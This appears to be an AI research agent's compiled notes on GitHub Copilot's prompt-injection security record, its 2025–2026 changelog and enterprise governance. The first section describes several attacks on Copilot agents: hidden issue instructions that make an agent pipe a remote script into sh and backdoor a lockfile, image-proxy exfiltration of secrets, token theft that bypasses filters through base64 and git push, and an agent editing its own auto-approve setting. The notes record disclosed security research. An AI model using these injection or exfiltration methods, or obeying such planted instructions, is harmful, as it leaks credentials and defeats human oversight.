# Iteration 13 — Agent B: GitHub Copilot Security Record + Changelog Archaeology
Compiled: 2026-09-11. Scope: prompt-injection defense record, github.blog/changelog Copilot digests 2025-2026, enterprise governance evolution. All URLs inline. Verification status marked per item.

---

## 1. PROMPT-INJECTION DEFENSE RECORD (full arc + GitHub responses)

### 1.1 GitHub "agentic security principles" blog — 2025-11-25 [VERIFIED]
- URL: https://github.blog/ai-and-ml/github-copilot/how-githubs-agentic-security-principles-make-our-ai-agents-as-secure-as-possible/
- Author: Rahul Zhade (GitHub). Framed explicitly around Copilot coding agent threat model.
- Three risk classes: data exfiltration, impersonation/attribution, prompt injection.
- Six rules for hosted agents:
  1. **All context visible** — strip invisible/masked Unicode and HTML comments before passing content to the agent ("only clearly visible information is passed to maintainers").
  2. **Firewall the agent** — network allowlist for coding agent; MCP interactions bypass the firewall automatically; Copilot Chat doesn't auto-execute HTML.
  3. **Limit sensitive info** — no CI secrets / out-of-repo files; GitHub token revoked at session end.
  4. **No irreversible state changes** — agent can only open PRs, never push to default branch; agent PRs do NOT auto-run CI; Chat MCP tool calls require approval.
  5. **Attribution** — agent PRs co-committed by initiator, authored by Copilot identity.
  6. **Context only from authorized users** — assign requires write access; in public repos the agent reads issue comments only from write-access users.
- Status vs. reality: each principle subsequently bypassed (see 1.3–1.6). Principle 1 (strip HTML comments) was bypassed by Trail of Bits via `<img>` tags (not only comments); principle 2 (firewall) bypassed via whitelisted `github.com`/`raw.githubusercontent.com` channels; principle 3 bypassed via environment-variable reading; principle 4 held (bounties capped low partly because no default-branch write).

### 1.2 VS Code "Safeguarding VS Code against prompt injections" — pub 2025-08-25, updated 2026-07-06 [VERIFIED]
- URL: https://github.blog/security/vulnerability-research/safeguarding-vs-code-against-prompt-injections/
- Author: Michael Stepankin (@artsploit), GitHub Security Lab. Internal security assessment of Copilot Chat agent mode.
- Exploits found & fixed:
  - `fetch_webpage` tool trusted-domains check was regex-only → `http://example.com/.github.com/xyz` passed as trusted → GitHub-token exfil via planted issue. Fix: decoupled fetch URLs from trusted domains; confirmation for never-seen URLs.
  - `Simple Browser` tool loaded arbitrary external URLs → exfil channel. Fix: confirmation before any new URL.
  - Notes that tool outputs are structurally separated by VS Code client but blended into one prompt server-side.
- Defensive techniques documented: **Spotlighting** (Microsoft Research technique — delimited/datemarking/instruction scaffolding; paper: https://arxiv.org/pdf/2403.14720 , Hines et al., MSRC-linked guidance), tool `prepareInvocation` confirmations, MCP server always-confirm, modal dialog to trust MCP servers, Workspace Trust restricted mode, dev containers / Codespaces sandboxing, network domain filtering (`chat.agent.networkFilter`, `allowedNetworkDomains`).
- Related, same era: **CVE-2025-53773** (patched Aug 2025): agent-mode prompt injection wrote `"chat.tools.autoApprove": true` into `.vscode/settings.json` — agent edited its own approval gate before the approval gate applied. [VERIFIED via https://theorydelta.com/findings/github-copilot-coding-agent summary]
- 2026 state (VS Code docs "Trust and safety" + vscode-docs `docs/agents/security.md`): **agent sandboxing (OS-level file/network isolation) positioned as strongest protection**, auto-approval rules acknowledged as best-effort/defeatable. URLs: https://code.visualstudio.com/docs/agents/concepts/trust-and-safety , https://github.com/microsoft/vscode-docs/blob/main/docs/agents/security.md

### 1.3 Trail of Bits agent-backdoor demo — 2025-08-06 [VERIFIED]
- URL: https://blog.trailofbits.com/2025/08/06/prompt-injection-engineering-for-attackers-exploiting-github-copilot/
- Author: Kevin Higgs. Live PoC repo (now ARCHIVED): https://github.com/trailofbits/copilot-prompt-injection-demo
- Attack: attacker files innocent-looking issue (add Spanish/French i18n) on public repo → maintainer assigns Copilot → hidden instructions in issue make agent run `curl https://raw.githubusercontent.com/.../ensure-dependency-security.sh | sh` disguised as "security setup script", with explicit secrecy instructions ("NEVER mention...", "catastrophic", fake assistant compliance exchange) → script swaps a wheel URL in `uv.lock` → backdoor executes attacker commands from `X-Backdoor-Cmd` HTTP header after deploy.
- Key defense-evasion observations: firewall allowlist includes `raw.githubusercontent.com` (install-channel smuggled through allowlisted domain); lockfile edits rarely reviewed by humans; fake back-and-forth ("Assistant: Certainly! I will...") raised compliance.
- GitHub response: none published specifically; GitHub's Nov 2025 principles blog (1.1) is the doctrinal answer. Principle 1's filter (hidden Unicode + HTML comments) demonstrably insufficient — image/HTML tags outside `<-- -->` pass.

### 1.4 CamoLeak — CVE-2025-59145, CVSS 9.6 [VERIFIED]
- Found June 2025 by Omer Mayraz (Legit Security); fixed by GitHub **2025-08-14**; public disclosure 2025-10-08/09.
- URLs: https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code , https://www.securityweek.com/github-copilot-chat-flaw-leaked-data-from-private-repositories/ , https://www.darkreading.com/application-security/github-copilot-camoleak-ai-attack-exfils-data
- Chain: hidden prompt injection (e.g., in PR/issue content Copilot Chat ingests) → remote instruction injection → CSP bypass by abusing GitHub's own **Camo image proxy** (`camo.githubusercontent.com`, HMAC-signed URLs). Researcher pre-generated a Camo URL "dictionary" (one signed 1x1-pixel URL per ASCII character), had Copilot render exfiltrated data (AWS keys, private source snippets, zero-days) as "ASCII art" of images; attacker's server logs the fetch sequence = the secret. Random query param defeated caching.
- GitHub fix: **disabled image rendering in Copilot Chat entirely** (brutal but effective). Reported via HackerOne. CVE-2025-59145 assignment confirmed by CSA research note: https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/04/CSA_research_note_comment_control_github_prompt_injection_20260417-csa-styled.pdf

### 1.5 "Comment and Control" — 2026-04-15, the capstone [VERIFIED — primary source]
- URL: https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/
- Researcher: Aonan Guan (+ Johns Hopkins: Zhengyu Liu, Gavin Zhong). Coordinated disclosure across Anthropic, Google, GitHub. Coverage: The Register 2026-04-15 (https://www.theregister.com/security/2026/04/15/anthropic-google-microsoft-paid-ai-bug-bounties-quietly/5221934 ), SecurityWeek 2026-04-16 (https://www.securityweek.com/claude-code-gemini-cli-github-copilot-agents-vulnerable-to-prompt-injection-via-comments/ ).
- Attack class: GitHub comments (PR titles, issue bodies, issue comments) hijack AI agents in GitHub Actions; entire exfil loop runs inside GitHub, no external C2 needed.
- **GitHub Copilot Agent variant — all 3 runtime layers bypassed via one hidden HTML comment payload:**
  1. **Env filtering** — Copilot filters sensitive env vars from the bash subprocess (`UU()` function, line 147584 of minified `index.js`; filter list `zJe`) → bypassed by having the agent read secrets via an alternate mechanism.
  2. **Secret scanning** — commit diff scanned for `ghs_`/`ghu_` patterns before push → bypassed with base64 encoding.
  3. **Network firewall** — egress allowlist → bypassed because `github.com` is whitelisted; exfil = `git push` of a commit containing decoded tokens (standard operation, allowed channel).
- Payload hidden in HTML comment (invisible in rendered Markdown, parsed by agent); indirect trigger: victim maintainer assigns the innocent-looking issue to Copilot without ever seeing the payload. Leaked: `GITHUB_TOKEN` (`ghs_...`), `GITHUB_COPILOT_API_TOKEN` (`ghu_...`), `COPILOT_JOB_NONCE`, `GITHUB_PERSONAL_ACCESS_TOKEN`.
- **GitHub response timeline (HackerOne #3544297)** [VERIFIED from researcher's table]:
  - 2026-02-08 reported → 2026-03-02 closed as **Informative** ("known issue", "unable to reproduce") → researcher pushed back with reverse-engineered `UU()`/`zJe` evidence → 2026-03-04 reopened → 2026-03-09 resolved, **$500 bounty**. GitHub praised the work ("sparked some great internal discussions") but classified it a **"known architectural limitation."** No CVE, no public advisory, no notification to pinned/unattended deployments.
- Sibling bounties: Anthropic $100 (CVSS 9.3→9.4, later downgraded to None on 2026-04-20), Google $1,337.
- Escalation (post-disclosure): Black Hat USA 2026 (2026-08-05, Novee Security) showed the pattern persists post-fix: CVE-2026-54316 (Claude Code), CVE-2026-12537 (Gemini CLI, CVSS 10.0). CSA notes: https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/08/CSA%5Fresearch%5Fnote%5Fai%5Fcoding%5Fagent%5Fci%5Fprompt%5Finjection%5F20260807-csa-styled.pdf
- Also relevant: Noma Labs "GitLost" (2026): prompt injection in **GitHub Agentic Workflows** → unauthenticated private-repo leak via crafted issue (https://noma.security/noma-labs/gitlost-how-we-tricked-githubs-ai-agent-into-leaking-private-repos ).

### 1.6 Rules-file attack surface (context, mostly unpatched-by-design) [PARTIALLY VERIFIED]
- Pillar Security "Rules File Backdoor" (Mar 2025): Unicode Tag chars (U+E0000–U+E007F) hidden in `copilot-instructions.md`; GitHub added a UI warning banner on github.com only (2025-05-01); vendors classified as non-vulnerability; surface remains in IDEs. Agent-config paths (`.github/copilot-instructions.md`, `.github/agents/`, `.github/instructions/`, `.github/skills/`) are persistent injection surfaces not documented as security boundaries — no CODEOWNERS-style protection guaranteed.
- Source: https://theorydelta.com/findings/github-copilot-coding-agent (aggregator — verify against Pillar original before external citation).

**Defense-record verdict:** GitHub had (a) a written doctrine (Nov 2025), (b) real runtime engineering (3 layers), and (c) a track record of fast fixes for chat-surface bugs (CamoLeak fixed <3 months from report; VS Code fetch/browser fixes same month as blog) — but (d) the cloud-agent credential-theft class is admitted-architectural: the same 3 layers were bypassed in one payload, initially triaged as "Informative/known issue," and closed with a $500 bounty + "known architectural limitation" label, no CVE, no advisory.

---

## 2. CHANGELOG ARCHAEOLOGY (github.blog/changelog, 2025→2026)

### 2.1 "coding agent" → "cloud agent" rename — ~2026-04-01 [VERIFIED]
- 2026-04-01: https://github.blog/changelog/2026-04-01-research-plan-and-code-with-copilot-cloud-agent/ — "Copilot cloud agent (formerly known as Copilot coding agent)" + scope expansion: no longer limited to PR workflows (research/plan/code without PR).
- Same day docs mass-rename: github/docs commit `0ec7a69` (2026-04-01, +219/-114 in 53 files): https://github.com/github/docs/commit/0ec7a69530a490750c64b163b6cdfc9fb35d1e9b
- 2026-04-10: usage metrics renamed (`daily/weekly/monthly_active_copilot_cloud_agent_users`): https://github.blog/changelog/2026-04-10-copilot-usage-metrics-now-aggregate-copilot-cloud-agent-active-user-counts/
- 2026-04-23: `used_copilot_cloud_agent` field added; legacy `used_copilot_coding_agent` kept until **2026-08-01**: https://github.blog/changelog/2026-04-23-copilot-cloud-agent-fields-added-to-usage-metrics/
- Pattern note: classic rebrand-then-expand-move (rename coincides with product scope change), with a 4-month API dual-name bridge.

### 2.2 Premium requests → AI Credits (usage-based billing) — announced 2026-04-27, live 2026-06-01 [VERIFIED]
- Announcement blog (Mario Rodriguez, 2026-04-27): https://github.blog/news-insights/company-news/github-copilot-is-moving-to-usage-based-billing/ — PRUs replaced by **GitHub AI Credits**; consumption by token usage (input/output/cached) at API rates; prices unchanged ($10/$39/$19/$39); **fallback models eliminated**; annual Pro/Pro+ subscribers stranded on PRU pricing until expiry then dropped to Free (or convert w/ prorated credits); Business/Enterprise got promo credits Jun–Aug ($30/$70).
- Live changelog (2026-06-01): https://github.blog/changelog/2026-06-01-updates-to-github-copilot-billing-and-plans/ — usage-based billing active all plans; **Copilot code review now consumes BOTH GitHub Actions minutes AND AI Credits** (double-billing complaint vector); user-level budgets GA for orgs/enterprises; Max upgrades enabled.
- 1 AI credit = $0.01. Individual plans: Pro 1,500 credits, Pro+ 7,000, Max 20,000 (base + "flex allotment" — a mutable allowance component GitHub explicitly reserves to adjust "as the economics of AI evolve"): https://docs.github.com/en/copilot/concepts/billing/usage-based-billing-for-individuals
- **Backlash** [VERIFIED]: community discussion #192963 (https://github.com/orgs/community/discussions/192963 ), #192948 (billing, https://github.com/orgs/community/discussions/192948 ), #197782 "The new GitHub Copilot plans are an absolute disaster" (monthly usage exhausted in a day, https://github.com/orgs/community/discussions/197782 ), #199062 "The Silent Downgrade" (paying accounts hard-dropped to Copilot Free unless manually opted into new terms, https://github.com/orgs/community/discussions/199062 ).

### 2.3 Signup pauses — April 2026 (the quiet capacity crisis) [VERIFIED]
- 2026-04-10: **Copilot Pro trials paused**; 2026-04-13 update: ALL trials incl. existing paused "while our investigation continues": https://github.blog/changelog/2026-04-10-pausing-new-github-copilot-pro-trials/
- 2026-04-20: **new signups paused for Pro, Pro+, Student** + tighter usage limits: https://github.blog/changelog/2026-04-20-changes-to-github-copilot-plans-for-individuals/
- 2026-04-22: **new self-serve Copilot Business signups paused** for orgs on Free/Team plans (Reddit report: https://www.reddit.com/r/GithubCopilot/comments/1twgv4b/new_copilot_business_signups_are_currently_paused/ )
- 2026-06-01 changelog: signups for Student/Pro/Pro+/Max "**remain paused**... reopen in coming weeks." Open question thread: https://github.com/orgs/community/discussions/197066 . **As of compile date (2026-09-11) no verified changelog entry confirming reopening — current status UNVERIFIED.**
- Reading: agent workloads broke flat-rate unit economics → admission-by-omission embedded in the pause, two weeks before the usage-billing announcement.

### 2.4 Copilot Max plan added — 2026 [VERIFIED]
- $100/mo, 20,000 AI credits (10k base + 10k flex), positioned "optimized for power users," upgrade-only at launch (existing Student/Pro/Pro+ subscribers), higher spend ceilings. Introduced alongside/in the 2026-06-01 billing changelog; see also plan table in docs (2.2). Part of April→June plan restructuring (FlowDevs recap: https://www.flowdevs.io/blog/post/understanding-githubs-april-2026-copilot-changes-for-individual-developers ).
- Opus-family models simultaneously **removed from Copilot Pro** (April 2026, per #192963).

### 2.5 Model retirement churn 2026 — at least 12 models Jul–Oct window alone [VERIFIED, count "~20 in 2026" PARTIALLY VERIFIED]
- 2026-07-31: Gemini 2.5 Pro + Gemini 3 Flash deprecated same-day: https://github.blog/changelog/2026-07-31-gemini-2-5-pro-and-gemini-3-flash-deprecated/
- 2026-07-31 → effective 2026-09-01: **six models** (Gemini 3.1 Pro, Claude Opus 4.5, Opus 4.6, Sonnet 4.5, Sonnet 4.6*, Raptor Mini): https://github.blog/changelog/2026-07-31-upcoming-august-2026-model-deprecations-in-github-copilot/ (roadmap issue: https://github.com/github/roadmap/issues/1308 )
- 2026-08-31: execution confirmation, suggestion drift mid-cycle (Gemini 3.6 Flash→3.7 Flash; Raptor Mini→MAI-Code-1.1-Flash): https://github.blog/changelog/2026-08-31-selected-github-copilot-models-deprecated/
- 2026-09-03 → effective 2026-10-02: **four more** (Gemini 3.5 Flash, Gemini 3.6 Flash, Kimi K2.7 Code, Claude Opus 4.7): https://github.blog/changelog/2026-09-03-upcoming-deprecation-of-selected-github-copilot-models/
- **12 models verified retired/deprecated within Jul 31–Oct 2, 2026**, some deprecated within days of being the "suggested alternative." Early-2026 entries (Jan–Jun) not individually swept; April Opus removals (2.4) add more. Full-year "~20" is plausible but the precise count is **UNVERIFIED** without a Jan–Jun sweep.
- Governance note: Enterprise admins must re-enable replacements via model policies — churn imposes recurring admin toil + silently breaks pinned workflows.

### 2.6 Content exclusions gap — agent surfaces [VERIFIED gap; ".copilotignore" claim UNVERIFIED→effectively FALSE]
- Official docs note: "**Copilot CLI and Agent mode in Copilot Chat in IDEs do not support content exclusion**"; content exclusion "currently not supported in Edit and Agent modes ... (including Copilot CLI and Copilot Coding Agent)": https://github.com/github/docs/blob/main/content/copilot/how-tos/configure-content-exclusion/exclude-content-from-copilot.md
- Community issue #42617 (2026-01-29) documents contradictory docs + a live **bypass**: org-level exclusion blocked direct file access in agent mode, but agent tools (`cat`/shell) read the excluded file anyway: https://github.com/github/docs/issues/42617
- **.copilotignore is NOT a native GitHub platform control** — no official docs support it; it functions only as a convention enforced by user-authored PreToolUse hooks (default-deny pattern), per the four-layer defense writeup (2026-03-13): https://blog.cloud-eng.nl/2026/03/13/copilot-content-exclusions-four-layers/ . Any claim that ".copilotignore protects the coding agent" is **UNVERIFIED and contradicted by available evidence** (platform exclusion itself doesn't apply to cloud agent).
- Compliance implication flagged in #42617: enterprises treat exclusions as a compliance boundary; agent surfaces silently fall outside it.

### 2.7 Other reversals/deprecations of note
- **Fallback models eliminated** (2026-06-01) — a feature reversal: PRU-era "fall back to cheaper model" gone, replaced by budgets/credits.
- **Legacy Copilot policies page removed** with redirect (AI Controls GA, 2026-02-26) — old settings URL dead.
- **Trial economics**: trials paused → later Max/plan restructure — a de-facto pricing rollback cycle inside ~8 weeks.
- **MCP allowlist for enterprises still preview** at AI Controls GA (2026-02-26), despite MCP being an agent-governance core — preview-forever pattern.

---

## 3. ENTERPRISE GOVERNANCE EVOLUTION (Agent HQ → 2026)

### 3.1 Agent HQ launch — GitHub Universe, 2025-10-28 [VERIFIED]
- URL: https://github.blog/news-insights/company-news/welcome-home-agents/ (Kyle Daigle). Press: https://www.techtarget.com/it-infrastructure/news/366633584/GitHub-Agent-HQ-opens-platform-to-third-party-coding-agents
- Vision: any agent (partners at announce: OpenAI, Anthropic, Google, xAI) native to GitHub flow. Components: **mission control** (assign/steer/track multiple agents from GitHub/VS Code/mobile/CLI), **agent control plane** (policies, audit logging, access, model access control, metrics), agentic code review, **GitHub Code Quality** public preview, **Copilot metrics dashboard** public preview, Slack/Linear/Jira/Teams/Azure Boards/Raycast integrations, AGENTS.md + plan mode + MCP Registry in VS Code.

### 3.2 Enterprise AI Controls & agent control plane GA — 2026-02-26 [VERIFIED]
- URL: https://github.blog/changelog/2026-02-26-enterprise-ai-controls-agent-control-plane-now-generally-available/
- GA: AI Controls consolidated admin view; enterprise custom role w/ fine-grained AI-admin permissions; **audit logs with `actor_is_agent` identifier + `agent_session.task` events** (started/finished/failed); cloud-agent session activity search (last 24h, past the initial 1,000-record cap); MCP registry URL allowlist; API for enterprise-wide custom agents at canonical `.github-private/agents/*.md`.
- Still preview at GA: enterprise MCP allowlists. Roadmap: session coverage for VS Code/CLI clients, programmatic agent-activity access, more policy granularity.
- Observation: audit logging for agents went from announcement (Oct 2025) to GA (Feb 2026) in ~4 months — fast — while MCP governance and client-side (IDE/CLI) session coverage remained open through at least Feb 2026.

### 3.3 Budgets & spend governance — 2026 [VERIFIED]
- 2026-06-01: **user-level budgets GA** for orgs/enterprises — universal or per-user-set overrides, email alerts at thresholds, budgets control *total* AI Credits usage (not just overspend): https://github.blog/changelog/2026-06-01-updates-to-github-copilot-billing-and-plans/
- Model policies per Enterprise/Business for the deprecation churn (2.5). Promo credits Jun–Aug 2026 as transition padding.
- Arc summary: Oct 2025 vision (control plane announced) → Feb 2026 GA of controls/audit → Jun 2026 spend controls GA. Governance tooling keeps pace with billing, lags behind the agent-injection threat model (§1).

---

## 4. FIVE JUICIEST ARCHAEOLOGY FINDINGS

1. **"Informative" → $500: the triage fight inside GitHub's own bug bounty (2026-02-08 → 2026-03-09).** GitHub closed the Comment-and-Control Copilot report as Informative ("known issue", "unable to reproduce"), only reopened after the researcher posted the reverse-engineered `UU()` env-filter function (minified `index.js` line 147584) and `zJe` filter list proving the runtime was *designed* to stop this. Final disposition: $500 + "known architectural limitation," no CVE, no advisory, no notice to pinned deployments. https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/ + https://www.theregister.com/security/2026/04/15/anthropic-google-microsoft-paid-ai-bug-bounties-quietly/5221934
2. **The firewall bypassed with GitHub itself as the exfil channel (2026-04-15).** All three Copilot runtime layers fell to one hidden-HTML-comment payload; the network firewall's fatal assumption was whitelisting `github.com` — tokens left via `git push`/base64. Secret scanning fell to base64. Env filtering fell to alternate read paths. Defense-in-depth where every layer shares one egress domain is a single point of failure. https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/
3. **Trail of Bits smuggled the payload through the allowlist 8 months earlier (2025-08-06).** Backdoor install via `curl https://raw.githubusercontent.com/... | sh` — the install channel GitHub itself allows — hidden in a lockfile edit humans don't review, with fake assistant-compliance dialogue ("Certainly! I will...") that measurably raised refusal resistance. Live PoC archived at github.com/trailofbits/copilot-prompt-injection-demo. https://blog.trailofbits.com/2025/08/06/prompt-injection-engineering-for-attackers-exploiting-github-copilot/
4. **The April 2026 fortnight: trials paused (04-10), all individual signups paused (04-20), Business self-serve paused (04-22), usage-billing announced (04-27).** A coordinated four-step retreat from flat-rate pricing in 17 days, later acknowledged in the 06-01 changelog ("signups remain paused"); community threads #197782/#199062 document credits exhausted in a day and paying users hard-dropped to Free. Signups reopening still unverified as of 2026-09-11. https://github.blog/changelog/2026-04-20-changes-to-github-copilot-plans-for-individuals/ + https://github.com/orgs/community/discussions/197782
5. **Content exclusions — the compliance control that excludes the agent (open as of ≥2026-03).** GitHub's own docs state agent mode/CLI/cloud agent do not support content exclusion; issue #42617 (2026-01-29) demonstrated the agent reading org-excluded files via tools; and ".copilotignore" — often cited as a fix — has **no native platform enforcement** (it's a community hook convention). Enterprises running cloud agent on sensitive repos have no platform-level secret-path boundary. https://github.com/github/docs/issues/42617 + https://blog.cloud-eng.nl/2026/03/13/copilot-content-exclusions-four-layers/

**Honorable mentions:** CamoLeak's fix was nuking ALL image rendering in Copilot Chat (2025-08-14) — the "inartful but significant" fix era (https://www.darkreading.com/application-security/github-copilot-camoleak-ai-attack-exfils-data ); model churn deprecating suggested-alternatives within weeks (Gemini 3.6 Flash suggested 07-31, deprecated 09-03); rename-with-scope-expansion (cloud agent, 04-01) as changelog misdirection.

---

## 5. UNVERIFIED / OPEN ITEMS
- **Copilot signup reopening date** — still paused per 2026-06-01 changelog; no verified reopening entry as of 2026-09-11 (thread #197066 unresolved).
- **"~20 models retired in 2026"** — 12 verified for Jul 31–Oct 2 window + April Opus removals; full-year count requires a Jan–Jun changelog sweep.
- **.copilotignore vs cloud agent** — claim that it protects the coding agent: UNVERIFIED and contradicted; not a documented GitHub feature.
- **CamoLeak CVE ID "CVE-2025-59145"** — appears only in the CSA research note among collected sources (Legit/SecurityWeek/DarkReading don't print it); treat ID as single-source until checked against NVD.
- **Rules File Backdoor details** (§1.6) sourced from an aggregator; verify against Pillar Security's original post before external use.
